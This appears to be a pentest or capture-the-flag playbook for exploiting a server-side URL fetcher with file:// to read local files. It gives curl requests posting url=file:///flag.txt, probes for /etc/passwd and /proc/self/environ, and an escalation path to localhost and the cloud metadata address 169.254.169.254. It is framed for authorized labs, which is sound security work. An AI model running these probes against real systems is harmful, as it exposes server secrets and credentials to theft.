# file:// Local File Read Via URL Fetcher

## Context

Use this when a server-side URL preview/fetch feature accepts a user-controlled URL and reflects fetched content in the response.

## Requirements

- Authorized lab, owned app, in-scope target, or defensive review.
- Do not store live secrets, tokens, cookies, flags, or private URLs in reusable files.

## Baseline Remote Fetch

```bash
curl -sS -X POST "https://[host]/fetch" -d "url=https://example.com/"
```

Useful signal:

```text
HTTP 200 OK
remote HTML/body reflected
```

## Direct Local File Read

```bash
curl -sS -X POST "https://[host]/fetch" -d "url=file:///flag.txt"
```

Alternative probes:

```text
file:///etc/passwd
file:///proc/self/environ
file:///etc/hosts
```

## Expected Signals

```text
file read: /flag.txt
contents in <pre> or JSON body
local plaintext instead of HTML
```

## Escalation Order

1. `file:///lab-provided-path`
2. `file:///etc/passwd`
3. `http://127.0.0.1/`
4. `http://169.254.169.254/`
5. parser-confusion localhost bypasses

## Why This Works

Some fetch utilities treat input as a generic URI and support filesystem access through `file://`. If developers only expect pasted HTTPS links, scheme validation may be missing entirely.

## Common Mistakes

- Jumping straight to complex localhost bypasses when `file://` was never blocked.
- Assuming no reflection means SSRF is impossible; some targets are blind.
- Testing only GET endpoints when the fetch form uses POST.

## Minimal Safe Proof

Use the smallest local file named by the lab prompt or a harmless system file before attempting broader file enumeration.

## Related Pattern

If `file://` is blocked but HTTP works, switch to parser-confusion payloads documented in:

```text
payloads/ssrf/userinfo-fragment-loopback-bypass.md
notes/url-parser-confusion-ssrf.md
```
